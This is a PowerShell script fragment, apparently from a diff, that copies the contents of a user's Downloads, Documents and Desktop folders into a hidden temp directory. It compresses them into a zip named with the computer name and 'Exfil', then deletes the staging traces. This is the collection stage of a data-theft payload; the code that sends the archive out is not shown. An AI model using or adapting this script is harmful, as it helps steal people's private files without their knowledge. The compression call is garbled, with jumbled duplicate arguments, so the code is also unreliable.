$userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
$zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
$tempPath = "$env:TEMP\$zipName"
$stagingDir = "$env:TEMP\ExfilStaging_$(Get-Random)"

try {
    # Verify folders exist
    # Create staging directory and copy all files from each folder
    New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null
$validFolders = $userFolders | Where-Object { Test-Path $_ }
if (-not $validFolders) {
throw "No valid folders found for compression"
}
    foreach ($folder in $validFolders) {
        $target = Join-Path $stagingDir ([IO.Path]::GetFileName($folder))
        Copy-Item -Path $folder\* -Destination $target -Recurse -Force -ErrorAction SilentlyContinue
    }

# Improved compression with .NET methods
Add-Type -AssemblyName System.IO.Compression.FileSystem
    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
    
[System.IO.Compression.ZipFile]::CreateFromDirectory(
        $validFolders[0], 
        $stagingDir, 
$tempPath,
        $compressionLevel,
        [System.IO.Compression.CompressionLevel]::Optimal,
$false  # Don't include base directory
)

@@ -44,4 +48,7 @@ finally {
if (Test-Path $tempPath) {
Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
}
    if (Test-Path $stagingDir) {
        Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
